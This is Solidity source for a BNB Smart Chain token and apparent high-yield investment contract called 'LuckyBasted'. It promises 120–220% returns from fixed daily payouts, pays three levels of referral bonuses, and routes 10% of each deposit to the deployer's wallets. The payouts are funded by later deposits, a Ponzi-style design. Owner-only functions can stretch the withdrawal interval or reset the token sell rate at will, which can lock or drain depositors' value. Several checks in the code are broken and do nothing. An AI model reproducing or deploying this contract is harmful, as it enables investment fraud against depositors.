/**
 *Submitted for verification at BscScan.com on 2022-08-16
*/

// SPDX-License-Identifier: MIT License
pragma solidity 0.8.9;
pragma experimental ABIEncoderV2;

interface IBEP20 {
  function totalSupply() external view returns (uint256);
  function decimals() external view returns (uint8);
  function symbol() external view returns (string memory);
  function name() external view returns (string memory);
  function getOwner() external view returns (address);
  function balanceOf(address account) external view returns (uint256);
  function transfer(address recipient, uint256 amount) external returns (bool);
  function allowance(address _owner, address spender) external view returns (uint256);
  function approve(address spender, uint256 amount) external returns (bool);
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
    * @dev Initializes the contract setting the deployer as the initial owner.
    */
    constructor () {
      address msgSender = _msgSender();
      _owner = msgSender;
      emit OwnershipTransferred(address(0), msgSender);
    }

    /**
    * @dev Returns the address of the current owner.
    */
    function owner() public view returns (address) {
      return _owner;
    }
    
    modifier onlyOwner() {
      require(_owner == _msgSender(), "Ownable: caller is not the owner");
      _;
    }

    function renounceOwnership() public onlyOwner {
      emit OwnershipTransferred(_owner, address(0));
      _owner = address(0);
    }

    function transferOwnership(address newOwner) public onlyOwner {
      _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal {
      require(newOwner != address(0), "Ownable: new owner is the zero address");
      emit OwnershipTransferred(_owner, newOwner);
      _owner = newOwner;
    }
}

contract LuckyBasted is Context, Ownable, IBEP20 {
    using SafeMath for uint256;
	
	mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;

    uint256 private _totalSupply;
    uint8 private _decimals;
    string private _symbol;
    string private _name;
	
    address payable public ceo;
    address payable public dev;
       
    uint8 public isScheduled;
    uint8 public isDaily;
    uint256 private constant DAY = 24 hours;
    uint256 private numDays = 1;
    
    uint16 constant PERCENT_DIVIDER = 1000; 
    uint16[3] private ref_bonuses = [100, 30, 20]; 

    uint256 public invested;
    uint256 public withdrawn;
    uint256 public ref_bonus;
   
    struct Tarif {
        uint256 life_days;
        uint256 percent;
    }

    struct Deposit {
        uint256 tarif;
        uint256 amount;
        uint40 time;
    }

    struct Player {
        address upline;
        uint256 dividends;
        uint256 ref_bonus;  
        
        uint256 total_invested;
        uint256 total_reinvested;
        uint256 total_withdrawn;
        uint256 total_ref_bonus;

        uint256 time_upper;
        uint256 roi_upper;
        uint256 team_upper;

        uint40 lastWithdrawn;
        
        Deposit[] deposits;
        uint256[3] structure; 
    }
 

    mapping(address => Player) public players;
    mapping(uint256 => Tarif) public tarifs;
    uint256 sellRate = 10000;
    uint256 constant BUYRATE = 3000;
    uint256 constant POOLRATE = 1000;
     
    constructor() {
        ceo = payable(msg.sender);		
        dev = payable(msg.sender);		
	
	    _name = "LuckyBasterd Token";
        _symbol = "BAST";
        _decimals = 18;
        _totalSupply =  10000000000 * 10**uint(_decimals); // 10B
        _balances[address(this)] = 8000000000 * 10**uint(_decimals); 
		emit Transfer(address(0), address(this), _balances[address(this)]);    
		_balances[msg.sender] = 2000000000 * 10**uint(_decimals); 
		emit Transfer(address(0), msg.sender, _balances[msg.sender]);    
		
        tarifs[17] = Tarif(17, 120); //7.06% daily for 17 days => 120% ROI    
        tarifs[27] = Tarif(27, 140); //5.19% daily for 27 days => 140% ROI    
        tarifs[47] = Tarif(47, 220); //4.68% daily for 47 days => 220% ROI    
        
    }

       
    function MakeDeposit(address referral, uint256 tarip) public payable {
        
        require(msg.value >= 0.025 ether, "Minimum Buy is 0.025 BNB");

        uint256 tokens = msg.value.mul(POOLRATE);
        require(_balances[address(this)].sub(tokens) >= 0,"Not enough tokens!");
        
        transferTokens(address(this), msg.sender, tokens);

        setUpline(msg.sender, referral);

        Player storage player = players[msg.sender];

        player.deposits.push(Deposit({
            tarif: tarip,
            amount: msg.value,
            time: uint40(block.timestamp)
        }));  

        uint256 shares = SafeMath.div(msg.value,20); 
        payable(dev).transfer(shares); 
        payable(ceo).transfer(shares);        
        
        player.total_invested += msg.value;
        
        invested += msg.value;
        withdrawn += shares;
        commissionPayouts(msg.sender, msg.value);
    }

    function setUpline(address _addr, address _upline) private {
        if(players[_addr].upline == address(0) && _addr != owner()) {

            if(_balances[_upline] <= 0) {
                _upline = owner();
            }
           
            players[_addr].upline = _upline;
            
            for(uint8 i = 0; i < 3; i++) {
                players[_upline].structure[i]++;

                if(i==0 && players[_upline].structure[i] == 5)
                {
                    players[_upline].team_upper = players[_upline].team_upper + SafeMath.div(1,2);    
                }
                _upline = players[_upline].upline;

                if(_upline == address(0)) break;
            }
          
        }
    }   
    
   
    function commissionPayouts(address _addr, uint256 _amount) private {
        address up = players[_addr].upline;

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            if(up == address(0)) break;
            
            uint256 bonus = _amount * ref_bonuses[i] / PERCENT_DIVIDER;
            payable(up).transfer(bonus); 
            players[up].total_ref_bonus += bonus;

            ref_bonus += bonus;
            withdrawn += bonus;
			     
            up = players[up].upline;
        }
    }
    
    function ExtendTime() public payable {        
        require(msg.value >= 0.03 ether, "Minimum is 0.03 BNB");

        uint256 shares = SafeMath.div(msg.value,10); 
        payable(dev).transfer(shares); 
        payable(ceo).transfer(shares);        
        
        Player storage player = players[msg.sender];
        player.time_upper = player.time_upper + 10;      
     }

    function UpgradeROI() public payable {        
        require(msg.value >= 0.05 ether, "Minimum is 0.05 BNB");

        uint256 shares = SafeMath.div(msg.value,10); 
        payable(dev).transfer(shares); 
        payable(ceo).transfer(shares);        
        
        Player storage player = players[msg.sender];
        player.roi_upper = player.roi_upper + 1;      
    }

    function transferTokens(address _from, address _to, uint256 amount) private {
        _balances[_to] = _balances[_to].add(amount);
        _balances[_from] = _balances[_from].sub(amount);
        emit Transfer(_from, _to, amount);
    }

    function userInfo(address _addr) view external returns(uint256 for_withdraw, 
                                                            uint256 total_invested, 
                                                                uint256 total_withdrawn, 
                                                                    uint256 total_ref_bonus,    
                                                                        uint40 lastPayout,                                                                                                                           
                                                                        uint256[3] memory structure) {
        Player storage player = players[_addr];

        uint256 payout = this.computePayout(_addr);

        for(uint8 i = 0; i < 3; i++) {
            structure[i] = player.structure[i];
        }

        return (
            payout + player.dividends + player.ref_bonus,
            player.total_invested,
            player.total_withdrawn,
            player.total_ref_bonus,
            player.lastWithdrawn,
            structure
        );
    }
    
    function userUpgrades(address _addr) view external returns(uint256 time_upper, 
                                                                    uint256 roi_upper, 
                                                                        uint256 team_upper) {
        Player storage player = players[_addr];
       return (
            player.time_upper,
            player.roi_upper,
            player.team_upper
        );
    }

    function computePayout(address _addr) view external returns(uint256 value) {
        Player storage player = players[_addr];

        for(uint256 i = 0; i < player.deposits.length; i++) {
            Deposit storage dep = player.deposits[i];
            Tarif storage tarif = tarifs[dep.tarif];

            uint256 time_end = dep.time + (tarif.life_days + player.time_upper) * 86400;
            uint40 from = player.lastWithdrawn > dep.time ? player.lastWithdrawn : dep.time;
            uint256 to = block.timestamp > time_end ? time_end : block.timestamp;

            if(from < to) {
                value += dep.amount * (to - from) * ((tarif.percent / tarif.life_days)+player.roi_upper + (player.team_upper/2)) / 8640000;
            }
        }
        return value;
    }

 
    function getPayout(address _addr) private {
        uint256 payout = this.computePayout(_addr);

        if(payout > 0) {
            players[_addr].lastWithdrawn = uint40(block.timestamp);
            players[_addr].dividends += payout;
        }
    }   
   

    function withdrawYields() external {
        
        Player storage player = players[msg.sender];

        if(isScheduled == 1) {
            require (block.timestamp >= (player.lastWithdrawn + (DAY * numDays)), "Not due yet for next Withdraw!");
        }     

        getPayout(msg.sender);

        require(player.dividends > 0 || player.ref_bonus > 0, "No Income Dividends Yet!");

        uint256 amount = player.dividends + player.ref_bonus;
	
        player.dividends = 0;
        player.ref_bonus = 0;
   
        player.total_withdrawn += amount;
       
       
        payable(msg.sender).transfer(amount);
        withdrawn += amount;
            
    }

    function nextWithdraw(address _addr) view external returns(uint40 next_sked) {
        Player storage player = players[_addr];
        if(player.deposits.length > 0)
        {
          return uint40(player.lastWithdrawn + (DAY * numDays));
        }
        return 0;
    }

    function SellTokens(uint256 amount) external {       
        Player storage player = players[msg.sender];    
        require(_balances[msg.sender] - amount >= 0,"Not enough tokens!");

        _balances[msg.sender] = _balances[msg.sender].sub(amount);
        _balances[address(this)] = _balances[address(this)].add(amount);
        emit Transfer(msg.sender, address(this), amount);
        
        uint256 bnb = amount.div(sellRate); 
        payable(msg.sender).transfer(bnb); 
        withdrawn += bnb;
        player.total_withdrawn += bnb;
    }
       

    function getBalance() public view returns(uint256) {
        return address(this).balance;
    }
    
    function setCEO(address newCEO) public onlyOwner returns (bool success) {
        ceo = payable(newCEO);
        return true;
    }

    function setDev(address newval) public onlyOwner returns (bool success) {
        dev = payable(newval);
        return true;
    }
    
    function setScheduled(uint8 newval) public onlyOwner returns (bool success) {
        isScheduled = newval;
        return true;
    }   
   
    function setDays(uint newval) public onlyOwner returns (bool success) {
        numDays = newval;
        return true;
    }
    
    function setSellRate(uint newval) public onlyOwner returns (bool success) {
        sellRate = newval;
        return true;
    }
       
    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return a < b ? a : b;
    }

    function getOwner() external view returns (address) {
        return owner();
    }

    function decimals() external view returns (uint8) {
        return _decimals;
    }

    function symbol() external view returns (string memory) {
        return _symbol;
    }

    function name() external view returns (string memory) {
        return _name;
    }

    function totalSupply() external view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) external view returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) external view returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "BEP20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "BEP20: decreased allowance below zero"));
        return true;
    }

    function burn(uint256 amount) public returns (bool) {
        _burn(_msgSender(), amount);
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "BEP20: transfer from the zero address");
        require(recipient != address(0), "BEP20: transfer to the zero address");

        _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    function _burn(address account, uint256 amount) internal {
        require(account != address(0), "BEP20: burn from the zero address");

        _balances[account] = _balances[account].sub(amount, "BEP20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal {
        require(owner != address(0), "BEP20: approve from the zero address");
        require(spender != address(0), "BEP20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _burnFrom(address account, uint256 amount) internal {
        _burn(account, amount);
        _approve(account, _msgSender(), _allowances[account][_msgSender()].sub(amount, "BEP20: burn amount exceeds allowance"));
    }

}


library SafeMath {
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
            // benefit is lost if 'b' is also tested.
            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}